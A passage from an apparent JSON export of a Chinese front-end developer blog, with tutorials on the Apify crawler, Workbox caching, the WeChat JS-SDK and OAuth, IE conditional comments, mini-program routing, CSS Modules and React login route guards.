不自带 html 请求与解析部分。 1234567891011121314151617181920212223const rp = require('request-promise-native');// 抓爬的 url 列表const requestList = new Apify.RequestList(&#123; sources: [ &#123; url: 'http://www.example.com/page-1' &#125;, &#123; url: 'http://www.example.com/page-2' &#125;, ],&#125;);// 初始化await requestList.initialize();const crawler = new Apify.BasicCrawler(&#123; requestList, handleRequestFunction: async (&#123; request &#125;) =&gt; &#123; await Apify.pushData(&#123; url: request.url, html: await rp(request.url), &#125;) &#125;,&#125;);await crawler.run(); 下面是 CheerioCrawler 的使用示例，可以看出 CheerioCrawler 为我们提供了请求 html 的数据以及 cheerio 解析之后的 $ 对象。 1234567891011121314151617181920212223242526272829// Prepare a list of URLs to crawlconst requestList = new Apify.RequestList(&#123; sources: [ &#123; url: 'http://www.example.com/page-1' &#125;, &#123; url: 'http://www.example.com/page-2' &#125;, ],&#125;);await requestList.initialize();// Crawl the URLsconst crawler = new Apify.CheerioCrawler(&#123; requestList, handlePageFunction: async (&#123; request, response, html, $ &#125;) =&gt; &#123; const data = []; // Do some data extraction from the page with Cheerio. $('.some-collection').each((index, el) =&gt; &#123; data.push(&#123; title: $(el).find('.some-title').text() &#125;); &#125;); await Apify.pushData(&#123; url: request.url, html, data, &#125;); &#125;,&#125;);await crawler.run(); PseudoUrlPseudoUrl 就是用来指定抓爬的页面伪地址。PseudoUrl 目前只接受使用正则 [RegExp] 来匹配。例如： 123const pseudoUrls = [ new Apify.PseudoUrl('https://xxx.com/[abc-\\d&#123;1,3&#125;]'),]; 上面将抓取 https://xxx.com/abc-12 等地址。 RequestListRequestList 是请求列表，RequestQueue 是请求队列。 RequestList 是用于 BasicCrawler 和 CheerioCrawler 里的请求列表。 1234567const requestList = new Apify.RequestList(&#123; sources: [ &#123; url: 'http://www.example.com/page-1' &#125;, &#123; url: 'http://www.example.com/page-2' &#125;, ],&#125;);await requestList.initialize(); RequestQueueRequestQueue 是专门用于 PuppeteerCrawler 里的请求队列。该队列用于深度爬网，您可以从多个 URL 开始，然后递归地跟踪指向其他页面的链接，数据结构支持广度优先和深度优先抓取页面。 1234const requestQueue = await Apify.openRequestQueue();await requestQueue.addRequest(&#123; url: 'https://donghua.agefans.com/' &#125;);// 跟踪的页面const pseudoUrls = [new Apify.PseudoUrl('https://donghua.agefans.com/[.*]')]; 数据存储Apify 有多种对特定任务有用的数据存储类型。数据存储在本地磁盘上，由 APIFY_LOCAL_STORAGE_DIR 环境变量定义的目录。 以下代码演示了键值存储的基本操作： 1234567891011121314151617// 获取一个默认的数据源const input = await Apify.getInput();// 设置一个字段await Apify.setValue('OUTPUT', &#123; myResult: 123 &#125;);// 打开一个数据源const store = await Apify.openKeyValueStore('some-name');// 设置await store.setValue('some-key', &#123; foo: 'bar' &#125;);// 获取const value = await store.getValue('some-key');// 删除操作await store.setValue('some-key', null); 参考资料 https://sdk.apify.com/docs/guides/motivation https://sdk.apify.com/docs/examples/basiccrawler","categories":[{"name":"爬虫","slug":"爬虫","permalink":"http://me.lizhooh.com/categories/爬虫/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"爬虫","slug":"爬虫","permalink":"http://me.lizhooh.com/tags/爬虫/"}]},{"title":"Workbox：一个离线存储神器","slug":"前端/Workbox：一个离线存储神器","date":"2019-04-21T12:24:55.000Z","updated":"2021-06-15T06:10:52.904Z","comments":true,"path":"/stories/2019/04/前端/Workbox：一个离线存储神器/","link":"","permalink":"http://me.lizhooh.com/stories/2019/04/前端/Workbox：一个离线存储神器/","excerpt":"前言GoogleChrome 曾经推出过两个用于 Service Worker （离线存储）的工具： sw-precache 和 sw-toolbox。不过因为这两个库 api 太分离，并且设计的不好，因此 GoogleChrome 在此推出了一个叫 workbox 的 Web App 静态资源和请求结果的本地存储的解决方案，该方案比起之前的使用更加简单与优雅。","text":"前言GoogleChrome 曾经推出过两个用于 Service Worker （离线存储）的工具： sw-precache 和 sw-toolbox。不过因为这两个库 api 太分离，并且设计的不好，因此 GoogleChrome 在此推出了一个叫 workbox 的 Web App 静态资源和请求结果的本地存储的解决方案，该方案比起之前的使用更加简单与优雅。 workbox 现在已经发布了 4.x 版本，它有以下的特性： 不管你的站点是何种方式构建的，都可以为你的站点提供离线访问能力。 就算你不考虑离线能力，也能让你的站点访问速度更加快。 几乎不用考虑太多的具体实现，只用做一些配置。 简单却不失灵活，可以完全自定义相关需求。 针对各种应用场景的多种缓存策略。 引入 Workbox在使用 Workbox 之前需要创建一个 service-worker.js 文件放在网站的根目录。 在页面里添加脚本加载 service-worker.js 1234567&lt;script&gt; if ('serviceWorker' in navigator) &#123; window.addEventListener('load', function() &#123; navigator.serviceWorker.register('/service-worker.js'); &#125;); &#125;&lt;/script&gt; 下面开始使用 Worker，从 cdn 里加载 Workbox。 12345678importScripts('https://storage.googleapis.com/workbox-cdn/releases/4.2.0/workbox-sw.js');if (workbox) &#123; console.log(`Yay! Workbox is loaded 🎉`);&#125;else &#123; console.log(`Boo! Workbox didn't load 😬`);&#125; 使用缓存当在 sw.js 能够拿到 workbox 全局变量，表明 workbox 可以使用了，workbox 能干什么呢？ 通过 workbox.precaching 模块来处理 Service Worker 静态资源的预缓存。 通过 workbox.routing 模块提供的路由控制和 workbox.strategies 模快提供的缓存策略控制帮助你做动态缓存。 使用 workbox 插件做一些 Service Worker 相对独立的工作，比如 更新提醒, Background Sync 等 在 workbox 里使用 precaching 进行预先缓存，使用 routing 进行动态的缓存。 缓存的策略大致可以分为以下： 重新验证时陈旧 - 如果请求可用，此策略将对请求使用缓存响应，并在后台使用网络响应更新缓存。（如果没有缓存，它将等待网络响应并使用它）。这是一种相当安全的策略，因为这意味着用户会定期更新其缓存。这种策略的缺点是它总是从网络请求资产，耗尽用户的带宽。 网络优先 - 这将首先尝试从网络获取请求。如果收到响应，它会将其传递给浏览器并将其保存到缓存中。如果网络请求失败，将使用最后一个缓存的响应。 首先缓存 - 此策略将首先检查缓存中的响应，如果有可用则使用该策略。如果请求不在缓存中，则将使用网络，并且在传递给浏览器之前，任何有效响应都将添加到缓存中。 仅限网络 - 强制响应来自网络。 仅缓存 - 强制响应来自缓存。 而这五个策略，对应的五个函数： 1234567891011121314151617181920workbox.routing.registerRoute( match, new workbox.strategies.StaleWhileRevalidate());workbox.routing.registerRoute( match, new workbox.strategies.NetworkFirst());workbox.routing.registerRoute( match, new workbox.strategies.CacheFirst());workbox.routing.registerRoute( match, new workbox.strategies.NetworkOnly());workbox.routing.registerRoute( match, new workbox.strategies.CacheOnly()); 假如首页没有使用到 index.js，在后面的页面才有使用到 index.js，但是你希望预先缓存 index.js，可以使用 precache 进行预先缓存。 123workbox.precaching.precacheAndRoute([ '/styles/index.js',]); 缓存的文件路径可以写成正则表达式，例如下面的缓存所有 js 文件。 1234workbox.routing.registerRoute( /.*\\.js$/, new workbox.strategies.NetworkFirst(),); 说明： 这个路由会缓存所有 js 文件。 workbox.strategies.NetworkFirst 是在首次访问时进行缓存。 可以从 cache storage 里看到已经存储的 js 文件。 Workbox 提供了一些可以使用的缓存策略。例如，CSS 可以首先从缓存中提供，然后在后台更新，或者您的图像可以缓存并使用，直到它为一周，之后它将需要更新。 123456789101112131415161718192021// 缓存 cssworkbox.routing.registerRoute( /.*\\.css$/, new workbox.strategies.StaleWhileRevalidate(&#123; cacheName: 'css-cache', &#125;),);// 缓存图像workbox.routing.registerRoute( /\\.(?:png|jpg|jpeg|svg|gif)$/, new workbox.strategies.CacheFirst(&#123; cacheName: 'image-cache', plugins: [ new workbox.expiration.Plugin(&#123; maxEntries: 30, maxAgeSeconds: 3600 * 24 * 7, &#125;), ], &#125;),); workbox 甚至可以缓存 html 文件，但我不建议这样做，除非你的站点是静态网站。 123456workbox.precaching.preacheAndRoute([ &#123; url: '/index.html', revision: '383676' &#125;,]); 剩下更多的了解，请参考文档。 参考资料 https://developers.google.cn/web/tools/workbox/guides/get-started","categories":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/categories/前端/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"}]},{"title":"微信 H5 开发笔记","slug":"前端/微信 H5 开发笔记","date":"2019-04-20T12:38:35.000Z","updated":"2021-06-15T06:10:52.907Z","comments":true,"path":"/stories/2019/04/前端/微信 H5 开发笔记/","link":"","permalink":"http://me.lizhooh.com/stories/2019/04/前端/微信 H5 开发笔记/","excerpt":"前言","text":"前言 JS-SDK微信的 JSSDK 暴露了一些微信 App 的原生功能给公众号页面使用，比如唤起支付、拍照、扫码、定制分享出去的标题链接等，微信 JS-SDK 需要在微信内置的浏览器才可以使用，其原理是使用了 JSBridge 向原生发起指令。 使用 JSSDK 主要包括： 判断当前客户端版本是否支持指定 JS 接口。 分享接口（微信认证）。 图像接口。 音频接口。 智能接口（识别语音并返回结果）。 设备信息（获取网络状态）。 地理位置。 界面操作。 微信扫一扫。 微信小店（服务号必须通过微信认证）。 微信卡券 （微信认证）。 微信支付（服务号必须通过微信认证）。 那么如何接入？ 步骤一：绑定域名。 步骤二：引入微信 JS-SDK 脚本文件。 步骤三：通过 config 接口注入权限验证配置。 12345678wx.config(&#123; debug: true, // 开启调试模式。 appId: '', // 必填，公众号的唯一标识。 timestamp: , // 必填，生成签名的时间戳（由后端提供）。 nonceStr: '', // 必填，生成签名的随机串（由后端提供）。 signature: '', // 必填，签名（由后端提供）。 jsApiList: [] // 必填，需要使用的 JS 接口列表。&#125;); 如果出现 {“errorMsg”:”config:invalid url domian”} 请检查步骤一：绑定域名 与你访问的域名是否在安全域名列表当中。 步骤四：通过 ready 接口处理成功验证（config 信息验证后会执行 ready 方法）。 12345678910111213141516wx.ready(function()&#123; // 1 判断当前版本是否支持指定 JS 接口，支持批量判断 document.querySelector('#checkJsApi').onclick = function () &#123; wx.checkJsApi(&#123; jsApiList: [ 'getNetworkType', 'previewImage' ], success: function (res) &#123; alert(JSON.stringify(res)); &#125; &#125;); &#125;; //下面就可以写一系列的接口了 ......&#125;); 步骤五：通过 error 接口处理失败验证。 123wx.error(function (res) &#123; alert(res.errMsg);&#125;); 最后具体详细使用可以看这份代码。 分享接口示例基本是使用到两个，分享给朋友，分享到朋友圈。 123456789101112131415// 分享给朋友wx.updateAppMessageShareData(&#123; title: '', // 分享标题 desc: '', // 分享描述 link: '', // 分享链接（安全域名） imgUrl: '', // 分享图标 success: function () &#123;&#125;&#125;);// 分享到朋友圈wx.updateTimelineShareData(&#123; title: '', // 分享标题 link: '', // 分享链接（安全域名） imgUrl: '', // 分享图标 success: function () &#123;&#125;&#125;); 图像接口示例选择图片，预览图片，上传图片，下载图片，获取本地图片链接。 123456789101112131415161718192021222324252627282930// 拍照或从手机相册中选图接口wx.chooseImage(&#123; count: 1, // 默认 9 sizeType: ['original', 'compressed'], // 是否压缩 sourceType: ['album', 'camera'], // 相机还是拍照 success: function (res) &#123; var localIds = res.localIds; &#125;&#125;);// 预览图片接口wx.previewImage(&#123; current: '', // 当前显示图片的 http 链接 urls: [] // 需要预览的图片 http 链接列表&#125;);// 上传图片接口wx.uploadImage(&#123; localId: '', // 需要上传的图片的本地 ID，由 chooseImage 接口获得 isShowProgressTips: 1, // 默认为 1，显示进度提示 success: function (res) &#123; var serverId = res.serverId; &#125;&#125;);// 下载图片接口wx.downloadImage(&#123; serverId: '', // 需要下载的图片的服务器端 ID，由 uploadImage 接口获得 isShowProgressTips: 1, // 默认为 1，显示进度提示 success: function (res) &#123; var localId = res.localId; &#125;&#125;); 地理位置示例12345678910111213141516171819// 使用微信内置地图查看位置接口。wx.openLocation(&#123; latitude: 0, // 纬度，浮点数，范围为 90 ~ -90 longitude: 0, // 经度，浮点数，范围为 180 ~ -180。 name: '', // 位置名 address: '', // 地址详情说明 scale: 1, // 地图缩放级别，整形值，范围从 1~28。默认为最大 infoUrl: '' // 在查看位置界面底部显示的超链接，可点击跳转&#125;);// 获取地理位置接口。wx.getLocation(&#123; type: 'wgs84', success: function (res) &#123; var latitude = res.latitude; // 纬度，浮点数，范围为90 ~ -90 var longitude = res.longitude; // 经度，浮点数，范围为180 ~ -180。 var speed = res.speed; // 速度，以米/每秒计 var accuracy = res.accuracy; // 位置精度 &#125;&#125;); 微信支付示例123456789// 发起一个支付wx.chooseWXPay(&#123; timestamp: 0, // 后端提供 nonceStr: '', // 支付签名随机串，不长于 32 位 package: '', // 统一支付接口返回的 prepay_id 参数值，提交格式如：prepay_id=\\*\\*\\*） signType: '', // 签名方式，默认为'SHA1'，使用新版支付需传入'MD5' paySign: '', // 支付签名 success: function (res) &#123;&#125;&#125;); 另外还有一种是使用 WeixinJSBridge 发起支付功能。 12345678910WeixinJSBridge.invoke('getBrandWCPayRequest', &#123; appId: '', // 公众号 ID timeStamp: '', // 时间戳，当前系统的时间，具体格式，请看API nonceStr: '', // 随机串，具体格式请看API package: '', // 扩展包 signType: 'SHA1', // 微信签名方式:sha1 paySign: '' // 微信签名&#125;, function(res)&#123; if (res.err_msg == 'get_brand_wcpay_request:ok') &#123;&#125;&#125;); 微信登录授权H5 端，进行微信登录授权： 第一步：用户同意授权，获取 code。 第二步：通过 code 换取网页授权 access_token。 第三步：刷新 access_token（如果需要）。 第四步：拉取用户信息（需 scope 为 snsapi_userinfo） 附：检验授权凭证（access_token）是否有效。 第一步用户同意授权，获取 code。 1234567const url = 'https://open.weixin.qq.com/connect/oauth2/authorize?' + qs.stringify(&#123; appid: '', redirect_uri: '', // 授权后重定向的回调链接地址，urlEncode response_type: 'code', scope: '', // 应用授权作用域 state: '', // 自定义带上的参数，例如 id&#125;) + '#wechat_redirect'; 微信会对授权链接做正则强匹配校验，如果链接的参数顺序不对，授权页面将无法正常访问 scope 几个值： snsapi_base：不弹出授权页面，直接跳转，只能获取用户 openid snsapi_userinfo：弹出授权页面，可通过 openid 拿到昵称、性别、所在地。 如果用户同意授权，页面将跳转至 redirect_uri/?code=CODE&amp;state=STATE。 第二步通过 code 换取网页授权 access_token。 123456const url = 'https://api.weixin.qq.com/sns/oauth2/access_token?' + qs.stringify(&#123; appid: '', secret: 'SECRET', // 公众号的 ppsecret code: 'CODE', // 填写第一步获取的code参数 grant_type: 'authorization_code',&#125;); 第三步刷新 access_token（如果需要），不需要则跳过。 12345const url = 'https://api.weixin.qq.com/sns/oauth2/refresh_token?' + qs.stringify(&#123; appid: '', grant_type: 'refresh_token', refresh_token: '', // 第二步获取的 refresh_token 参数&#125;); 第四步拉取用户信息（需 scope 为 snsapi_userinfo） 12345const url = 'https://api.weixin.qq.com/sns/userinfo?' + qs.stringify(&#123; access_token: '', openid: '', // openid 在第二步获取到，而且唯一的 lang： '',&#125;); 附检验授权凭证（access_token）是否有效。 1234const url = 'https://api.weixin.qq.com/sns/auth?' + qs.stringify(&#123; access_token: '', // 第二步获取的 openid: '', // 第二步获取的&#125;); 参考资料 https://developers.weixin.qq.com/doc/offiaccount/OA_Web_Apps/JS-SDK.html","categories":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/categories/前端/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"}]},{"title":"什么？兼容 IE！HTML 条件注释判断","slug":"前端/什么？兼容 IE！HTML 条件注释判断","date":"2019-04-13T04:43:51.000Z","updated":"2021-06-15T06:10:52.904Z","comments":true,"path":"/stories/2019/04/前端/什么？兼容 IE！HTML 条件注释判断/","link":"","permalink":"http://me.lizhooh.com/stories/2019/04/前端/什么？兼容 IE！HTML 条件注释判断/","excerpt":"前言经常被误解最简单的前端开发技术有多难，兼容性就让你头疼？ 条件注释在 HTML 里有一种叫条件注释，一般用于判断 IE 的版本然后做出各种兼容手段。 具体语法如下：&lt;!--[if IE 6]&gt; 执行内容 &lt;![endif]--&gt;。","text":"前言经常被误解最简单的前端开发技术有多难，兼容性就让你头疼？ 条件注释在 HTML 里有一种叫条件注释，一般用于判断 IE 的版本然后做出各种兼容手段。 具体语法如下：&lt;!--[if IE 6]&gt; 执行内容 &lt;![endif]--&gt;。 1234567891011&lt;!--[if IE]&gt; 所有的 IE 可执行 &lt;![endif]--&gt;&lt;!--[if IE 6]&gt; 仅 IE6 可执行 &lt;![endif]--&gt;&lt;!--[if lt IE 6]&gt; IE6 以及 IE6 以下版本可执行 &lt;![endif]--&gt;&lt;!--[if gte IE 6]&gt; IE6 以及 IE6 以上版本可执行 &lt;![endif]--&gt;&lt;!--[if IE 7]&gt; 仅 IE7 可执行 &lt;![endif]--&gt;&lt;!--[if lt IE 7]&gt; IE7 以及 IE7 以下版本可执行 &lt;![endif]--&gt;&lt;!--[if gte IE 7]&gt; IE7 以及 IE7 以上版本可执行 &lt;![endif]--&gt;&lt;!--[if IE 8]&gt; 仅 IE8 可执行 &lt;![endif]--&gt;&lt;!--[if IE 9]&gt; 仅 IE9 可执行 &lt;![endif]--&gt;&lt;!--[if !IE]&gt;&lt;!--&gt; 除 IE 外都可执行 &lt;!--&lt;![endif]--&gt; 常见 html 标签加 ie 类的特殊处理。 1234567&lt;!--[if IE 6]&gt; &lt;html class='ie lt-ie8'&gt; &lt;![endif]--&gt;&lt;!--[if IE 7]&gt; &lt;html class='ie lt-ie8'&gt; &lt;![endif]--&gt;&lt;!--[if IE 8]&gt; &lt;html class='ie ie8'&gt; &lt;![endif]--&gt;&lt;!--[if IE 9]&gt; &lt;html class='ie ie9'&gt; &lt;![endif]--&gt;&lt;!--[if !IE]&gt;&lt;!--&gt;&lt;html&gt;&lt;!--&lt;![endif]--&gt; 用于判断 ie9 及其以下的浏览器： 1234567891011121314151617181920212223242526(function (w) &#123; if (!(\"WebSocket\" in w &amp;&amp; 2 === w.WebSocket.CLOSING)) &#123; var d = document.createElement(\"div\"); var url = 'http://browsehappy.osfipin.com/'; d.className = \"browsehappy\"; d.innerHTML = '&lt;div style=\"width:100%;height:50px;font-size:15px;' + 'line-height:50px;text-align:center;background-color:#484848;' + 'color:#f4f4f4;margin-bottom:40px;\"&gt;你的浏览器过旧，&lt;strong&gt;' + '继续使用将可能会引起安全性问题。&lt;/strong&gt;&lt;a target=\"_blank\" ' + 'href=\"' + url + '\" style=\"background-color:#888;text-decoration:' + ' none;padding: 6px 12px;border-radius: 4px;color:#fff' + ';margin-left: 12px\"&gt;立即升级&lt;/a&gt;&lt;/div&gt;'; var n = 0; var f = function () &#123; var s = document.getElementsByTagName(\"body\")[0]; if (\"undefined\" == typeof (s) &amp;&amp; n &lt; 50) &#123; n += 1; setTimeout(f, 100); &#125; else &#123; s.insertBefore(d, s.firstChild); &#125; &#125;; f(); &#125;&#125;(window));","categories":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/categories/前端/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"}]},{"title":"小程序路由控制（Navigator）详解","slug":"小程序/小程序路由控制（Navigator）详解","date":"2019-04-01T12:04:59.000Z","updated":"2021-06-15T06:10:52.914Z","comments":true,"path":"/stories/2019/04/小程序/小程序路由控制（Navigator）详解/","link":"","permalink":"http://me.lizhooh.com/stories/2019/04/小程序/小程序路由控制（Navigator）详解/","excerpt":"前言小程序提供了 Navigator 这样的一个组件，可以实现页面之间路由的转跳。 路由转跳Navigator 的跳转会分两种：一种是使用标签跳转，另一种是使用 js 控制跳转。","text":"前言小程序提供了 Navigator 这样的一个组件，可以实现页面之间路由的转跳。 路由转跳Navigator 的跳转会分两种：一种是使用标签跳转，另一种是使用 js 控制跳转。 123456789// 标签跳转&lt;navigator url='/home'&gt;页面跳转&lt;/navigator&gt;// js 跳转wx.navigateTo(&#123; url: '/home', success: () =&gt; &#123;&#125;, fail: () =&gt; &#123;&#125;, complete: () =&gt; &#123;&#125;,&#125;); 跳转方式使用 open-type 设置跳转方式，可以是追加路由或者是代替路由，或者是切换 Tab。 123&lt;navigator url=\"/a\"&gt;跳转到新页面&lt;/navigator&gt;&lt;navigator url=\"/b\" open-type=\"redirect\"&gt;在当前页打开&lt;/navigator&gt;&lt;navigator url=\"/c\" open-type=\"switchTab\"&gt;切换 Tab&lt;/navigator&gt; 那么怎么在页面里关闭？使用 wx.navigateBack API。 123onBack = e =&gt; &#123; wx.navigateBack(&#123; delta: -1 &#125;); // delta 是路由栈退回的深度&#125; 传递数据如何传递参数，目前只能通过 query 的方式传递参数。 12345678910111213import qs from 'qs';// ... 当前页const url = '/home?data=' + JSON.stringify(&#123; name: 'xiao ming' &#125;);&lt;navigator url=&#123;url&#125;&gt;页面跳转&lt;/navigator&gt;// ... 当前页wx.navigateTo(&#123; url: 'home?' + qs.stringify(&#123; name: 'xiao ming', age: 20, &#125;),&#125;); 接收数据：在目标页的 onload 里会获取到 query 的数据。 123onLoad(query) &#123; console.log(query.data); // \"&#123; name: 'xiao ming' &#125;\"&#125; 回传数据在返回路由时如何回传数据给父路由呢？目前小程序并没有提供这种功能，但是我们可以使用 redux 等这样的全局数据管理框架实现这个功能。 参考资料 https://developers.weixin.qq.com/miniprogram/dev/component/navigator.html https://nervjs.github.io/taro/docs/router.html","categories":[{"name":"小程序","slug":"小程序","permalink":"http://me.lizhooh.com/categories/小程序/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"小程序","slug":"小程序","permalink":"http://me.lizhooh.com/tags/小程序/"}]},{"title":"CSS Modules 使用指南","slug":"Style/CSS Modules 使用指南","date":"2019-04-01T07:46:09.000Z","updated":"2021-06-15T06:10:52.894Z","comments":true,"path":"/stories/2019/04/Style/CSS Modules 使用指南/","link":"","permalink":"http://me.lizhooh.com/stories/2019/04/Style/CSS Modules 使用指南/","excerpt":"前言我们知道 CSS 是全局作用域有效的，因此在实际的开发中会遇到很多的碰壁，命名冲突，类名覆盖的问题，而 CSS Modules 的出现就是为了解决这些问题。 什么是 CSS Modules？ 简单的说就是所有的 class 的名称和动画的名称默认属于本地作用域的 CSS 文件。其核心类似 javascript 模块化的概念。","text":"前言我们知道 CSS 是全局作用域有效的，因此在实际的开发中会遇到很多的碰壁，命名冲突，类名覆盖的问题，而 CSS Modules 的出现就是为了解决这些问题。 什么是 CSS Modules？ 简单的说就是所有的 class 的名称和动画的名称默认属于本地作用域的 CSS 文件。其核心类似 javascript 模块化的概念。 设计特点CSS Modules 的设计特点是首要解决 CSS 全局样式污染的问题，因此它有以下的设计特点： CSS 能力增强。 集中在一个地方。 只应用于那个组件，其他组件不适用。 除此之外，任何组件都能拥有真正的依赖。 提高开发效率、便于代码维护。 目前不支持嵌套的写法。 基本使用在 CSS Modules 里，每一个 css 文件都是独立的存在，尽管有两个 css 文件都有 .title，但是在使用到组件的时候会自动加 hash，实际编译类似 [filename]_[classname]_[hash] 这种结构。 CSS Modules 的使用非常简单，把他当成 js 来使用即可。在 create-react-app 里支持 CSS Modules，但是需要把 css 文件名称命名为 xxx.module.css 才可以。 下面创建一个 app.module.css 文件。 1234.title &#123; font-size: 32px; font-weight: normal;&#125; 在组件里引入样式。 12345678910import React from 'react';import styles from './style.module.css';console.log(styles); // &#123; title: 'style_title__Jxmdp' &#125;export default (&#123; title &#125;) =&gt; ( &lt;div&gt; &lt;h2 className=&#123;styles.title&#125;&gt;&#123;title&#125;&lt;/h2&gt; &lt;/div&gt;); 因此每个 CSS Modules 都是独立性的局部作用域。CSS Modules 自带原生 css 的功能，除此之外还附带下面这些功能。 定义变量下面的代码定义了几个变量，类似 less 的变量。 12345@value myRed: #f45;.title &#123; color: myRed;&#125; 导入变量12345678@value colors: './color.css'; // 导入样式@value blue, red, green from colors;// 等效于@value blue, red, green from './color.css';.title &#123; color: red;&#125; 样式组合使用 composes 实现类似 less/sass 的混合行为。 123456789101112131415161718.base &#123; font-size: 20px;&#125;// .normal 基础了 .base 的属性.normal &#123; composes: base; color: #333;&#125;@value title from './style.css';.otherClassName &#123; composes: title from './style.css'; // 等效于 composes: title;&#125; 全局样式CSS Modules 允许用 :global(.className) 的语法声明一个全局的作用域。加了 :global 的不会被编译成哈希值，会原封不动的输出。 123:global(.title) &#123; color: black;&#125; 参考资料 https://github.com/css-modules/css-modules https://facebook.github.io/create-react-app/docs/adding-a-css-modules-stylesheet","categories":[{"name":"CSS","slug":"CSS","permalink":"http://me.lizhooh.com/categories/CSS/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"CSS","slug":"CSS","permalink":"http://me.lizhooh.com/tags/CSS/"}]},{"title":"谈谈 SPA 应用路由拦截","slug":"React/React/谈谈 SPA 应用路由拦截","date":"2019-03-31T03:52:56.000Z","updated":"2021-06-15T06:10:52.882Z","comments":true,"path":"/stories/2019/03/React/React/谈谈 SPA 应用路由拦截/","link":"","permalink":"http://me.lizhooh.com/stories/2019/03/React/React/谈谈 SPA 应用路由拦截/","excerpt":"前言我们都知道在开发单页面应用的时候，在路由部分基本完全由前端来控制。SAP 应用大多都会有登录功能，主要会有全局登录，即不登录不给使用，其次就是部分登录，部分页面需要登录才能使用。 好了，本文以 React、React Router 来解说，如何在 SPA 应用里进行路由的拦截，实现全局登录拦截，和部分登录拦截。","text":"前言我们都知道在开发单页面应用的时候，在路由部分基本完全由前端来控制。SAP 应用大多都会有登录功能，主要会有全局登录，即不登录不给使用，其次就是部分登录，部分页面需要登录才能使用。 好了，本文以 React、React Router 来解说，如何在 SPA 应用里进行路由的拦截，实现全局登录拦截，和部分登录拦截。 全局拦截面向后台管理的 SPA 应用，几乎都是登录之后才能访问。对于这种拦截，我将使用 redux 存储登录的状态（如果是保持 7 天登录，则把 token 存在 localStorage 里），在路由的顶层进行拦截。 整个流程如下： 具体看下面的代码的实现。 12345678910111213141516171819202122232425262728293031323334353637import React, &#123; Component &#125; from 'react';import &#123; Route, Switch, withRouter &#125; from 'react-router-dom';import &#123; connect &#125; from 'react-redux';import routes from './routes';import Loading from './components/Loading';import &#123; actions &#125; from './stores';const action = actions.user;class App extends Component &#123; componentDidMount() &#123; const &#123; location, history &#125; = this.props; action.checkLoginState( location.pathname, () =&gt; history.replace('/login'), ); &#125; render() &#123; const &#123; isLogin, checkEnd &#125; = this.props.user; if (!isLogin &amp;&amp; !checkEnd) return &lt;Loading /&gt;; return ( &lt;div&gt; &lt;Switch&gt; &#123;routes.map((item, index) =&gt; ( &lt;Route key=&#123;index&#125; &#123;...item&#125; /&gt; ))&#125; &lt;/Switch&gt; &lt;/div&gt; ); &#125;&#125;export default connect( state =&gt; (&#123; user: state.user &#125;),)(withRouter(App)); 说明： 使用 connect 连接到 redux 的 store 里，store 里切分一个 user 的分支用于存储用户相关的信息。 isLogin 是用于判断和设置是否是已经登录了，checkEnd 用于判断是否已经检查完毕登录状态。 isLogin 默认为 false, checkEnd 默认为 false，在这种情况下会显示一个加载组件。 在 componentDidMount 里开始进行检查。 下面是 redux user 部分的代码。 123456789101112131415161718192021222324export default (&#123; commit, getState &#125;) =&gt; (&#123; initState: &#123; isLogin: false, // 是否已经登录了 checkEnd: false, // 是否检查结束 &#125;, _wati: time =&gt; new Promise(rs =&gt; setTimeout(rs, time)), // 检查登录状态 async checkLoginState(path, failCallback = _ =&gt; _) &#123; // 这里可以做白名单，非拦截部分 if (path === '/login') &#123; return commit(&#123; checkEnd: true &#125;); &#125; // 模拟 api 请求等待 await this._wati(1000); // 检查通过了 // commit(&#123; isLogin: true, checkEnd: true &#125;); // 检测不通过 failCallback(); commit(&#123; checkEnd: true &#125;); &#125;,&#125;); 说明： 使用 1 秒的等待模拟 api 请求的时间（实际的 api 请求会在 50 ~ 300 ms 之间）。 如果当前的页面路径是 /login，则不需要检查。 如果检查通过则把 isLogin 和 checkEnd 设置为 true。 如果检查不通过则把 checkEnd 设置为 true。 上图是访问受保护的路径时，未登录被拦截，转跳到登录页的情况。 部分拦截在路由表上添加 auth 属性用于标识是否需要拦截，也就是白名单。 12345678910111213141516export default [ &#123; path: '/', exact: true, component: Index, &#125;, &#123; path: '/login', component: Login, &#125;, &#123; auth: true, path: '/user', component: User, &#125;,]; 在检查拦截处添加白名单的入口。 12345678910111213141516171819202122componentDidMount() &#123; const &#123; location, history &#125; = this.props; action.checkLoginState( location.pathname, routes.filter(i =&gt; i.auth).map(i =&gt; i.path), () =&gt; history.replace('/login'), );&#125;// 检查登录状态async checkLoginState(path, list = [], failCallback = _ =&gt; _) &#123; if (!list.includes(path)) &#123; return commit(&#123; checkEnd: true &#125;); &#125; await this._wati(1000); // 检查通过了 // commit(&#123; isLogin: true &#125;); // 检测不通过 failCallback(); commit(&#123; checkEnd: true &#125;);&#125;, 示例代码 https://github.com/Lizhooh/react-router-login-intercept-demo","categories":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/categories/React/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"}]},{"title":"Storybook：编写 React 组件最佳的选择","slug":"React/React/Storybook：编写 React 组件最佳的选择","date":"2019-03-30T13:00:28.000Z","updated":"2021-06-15T06:10:52.879Z","comments":true,"path":"/stories/2019/03/React/React/Storybook：编写 React 组件最佳的选择/","link":"","permalink":"http://me.lizhooh.com/stories/2019/03/React/React/Storybook：编写 React 组件最佳的选择/","excerpt":"前言Storybook 是一个开源工具，用于为 React，Vue 和 Angular 单独开发 UI 组件。它使构建令人惊叹的 UI 组织和有效性。 在没有使用 Storybook 